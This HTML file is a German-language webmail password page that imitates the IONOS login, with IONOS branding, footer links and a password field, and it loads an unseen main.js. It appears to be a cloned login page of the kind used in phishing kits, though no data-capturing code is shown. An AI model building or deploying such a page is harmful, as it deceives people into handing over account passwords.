<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <link rel="stylesheet" href="password.css" />
    <link rel="shortcut icon" type="image/x-icon" href="/favicon/favicon.ico" />
    <link
      rel="stylesheet"
      href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css"
    />
    <title>Login – Zugang zu Ihrem Kundenkonto</title>
  </head>
  <body>
    <header class="header">
      <div class="logo-tag">
        <img src="/logo.png" alt="logo" class="logo" />
        <span>WEBMAIL LOGIN</span>
      </div>
      <div class="input-bar">
        <i class="bi bi-search"></i>
        <input
          class="oao-navi-search-input"
          type="search"
          placeholder="Nach Funktionen, Domains und Hilfe suchen"
        />
        <i class="bi bi-mic-fill"></i>
      </div>
      <?xml version="1.0" encoding="UTF-8"?><svg
        width="51px"
        height="51px"
        stroke-width="1.5"
        viewBox="0 0 24 24"
        fill="none"
        xmlns="http://www.w3.org/2000/svg"
        color="#000000"
      >
        <path
          d="M9 9C9 5.49997 14.5 5.5 14.5 9C14.5 11.5 12 10.9999 12 13.9999"
          stroke="#000000"
          stroke-width="1.5"
          stroke-linecap="round"
          stroke-linejoin="round"
        ></path>
        <path
          d="M12 18.01L12.01 17.9989"
          stroke="#000000"
          stroke-width="0.5"
          stroke-linecap="round"
          stroke-linejoin="round"
        ></path>
        <path
          d="M12 22C17.5228 22 22 17.5228 22 12C22 6.47715 17.5228 2 12 2C6.47715 2 2 6.47715 2 12C2 13.8214 2.48697 15.5291 3.33782 17L2.5 21.5L7 20.6622C8.47087 21.513 10.1786 22 12 22Z"
          stroke="#000000"
          stroke-width="1.5"
          stroke-linecap="round"
          stroke-linejoin="round"
        ></path>
      </svg>
    </header>

    <div class="container">
      <form action="/" class="form" id="form">
        <div class="img-tag">
          <img src="/password.svg" alt="account" class="img" />
          <h2>Passwort eingeben</h2>
        </div>
        <div class="input-email">
          <label for="">Passwort</label>
          <input type="password" name="password" id="password" />
          <p class="input-title">
            Nicht Ihr Gerät? Melden Sie sich nach der Sitzung ab oder verwenden
            Sie den
            <span><a href="" class="span">privaten Browsermodus.</a></span>
          </p>
          <div class="enter">
            <a href="https://www.ionos.de/" type="submit" class="btn">Weiter</a>
          </div>
        </div>
        <div class="form-fotter"></div>
      </form>
    </div>

    <footer class="footer">
      <div>
        <span class="circle"></span>
        <a href="">Alle Systeme funktional</a>
      </div>
      <div>
        <span>© 2024<a href="">IONOS SE</a></span>
      </div>
      <div>
        <span><a href="">Impressum</a> - </span>
        <span><a href="">Datenschutz</a> - </span>
        <span><a href="">AGB</a></span>
      </div>
    </footer>
    <script src="main.js"></script>
  </body>
</html>
